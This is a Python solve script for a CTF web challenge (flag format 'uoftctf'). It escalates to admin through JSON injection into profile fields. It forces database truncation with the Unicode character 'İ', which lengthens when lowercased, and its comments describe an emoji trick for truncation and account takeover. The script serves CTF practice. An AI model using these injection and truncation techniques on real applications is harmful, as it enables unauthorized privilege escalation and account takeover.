import re
import requests

base_url = "http://34.123.200.191"
account = {"username": "3?0}I2`6ZW~mR@5", "password": "3?0}I2`6ZW~mR@5"}

s = requests.Session()

r = s.post(f"{base_url}/register", json=account)
print("Register Status:", r.status_code)

r = s.post(f"{base_url}/login", json=account, allow_redirects=False)
print("Login Status:", r.status_code)

# If we do a JSOn injection into the "data" field, we can set the "role" field to "admin". However, there will still be a trailing , "role":"user"} in the JSON.

# We need a way to truncate this. Since sql's strict mode is disabled, the "data" field gets silently truncated to 255 characters. However, we are limited to 10 characters for the phone number, 16 characters for the credit card number, and 45+45 characters for the question and answer. In total, that gives us 116 characters. This is not enough to overflow the "data" field and cause a truncation of the trailing role property set by the server.

# To bypass this, we make use the of the fact that after insecurely stringifying the object, db.convert() also converts the result to lowercase. This lets us make use of a special character, İ. When converted to lowercase, this character becomes length 2. We use this feature to cause a truncation of the "data" field after successfully injecting JSON to set our role to "admin".

payload = {
    "phone": "1234567890",
    "credit_card": "1234567890987654",
    "secret_question": "İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ", 
    "secret_answer": 'İİİİİİİİİİİİİİİİİİİİİİİİ","role":"admin"}',
    "current_password": account['password']
}

# There is also an unintended solution that many teams used to solve the challenge. You can place an emoji at the end of your JSON injection to cause a truncation. Interestingly, this technique also lets you gain access to any user, including the admin. You can simply by registering a new account with the name USERNAME😀 and a user-controlled password, then login to USERNAME (without the emoji). However, just logging into the admin account would not yield the flag, as the admin account was not actually given the "admin" role. 

# payload = {
#     "phone": "1234567890",
#     "credit_card": "1234567890987654",
#     "secret_question": "asd", 
#     "secret_answer": 'a","role":"admin"}😀',
#     "current_password": account['password']
# }

r = s.put(f"{base_url}/profile", json=payload)
print("Profile Update Status:", r.status_code)

dashboard_response = s.get(f"{base_url}/dashboard")
print("Dashboard Status:", dashboard_response.status_code)

flag_pattern = re.compile(r"uoftctf{.*?}")
matches = flag_pattern.findall(dashboard_response.text)
print("Flag:", matches[0])
